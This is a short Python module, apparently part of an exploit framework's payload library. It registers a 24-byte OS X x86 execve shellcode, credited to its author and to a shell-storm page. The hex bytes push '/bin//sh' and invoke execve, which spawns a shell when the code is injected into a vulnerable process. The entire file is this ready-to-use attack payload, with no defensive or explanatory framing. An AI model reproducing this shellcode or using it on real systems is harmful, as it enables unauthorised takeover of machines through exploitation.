from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Simon Derouineau"
    Shellcode.info["name"] = "OSX86 - execve shellcode"
    Shellcode.info["references"] = [
        "http://shell-storm.org/shellcode/files/shellcode-692.php"
    ]
    Shellcode.info["size"] = 24
    Shellcode.info["payload"] = [
        r"\x31\xC0\x50"						
        r"\x68\x2F\x2F\x73\x68"			
        r"\x68\x2F\x62\x69\x6E"			
        r"\x89\xE3\x50\x50\x53"				
        r"\xB0\x3B\x6A\x2A"						
        r"\xCD\x80"
    ]
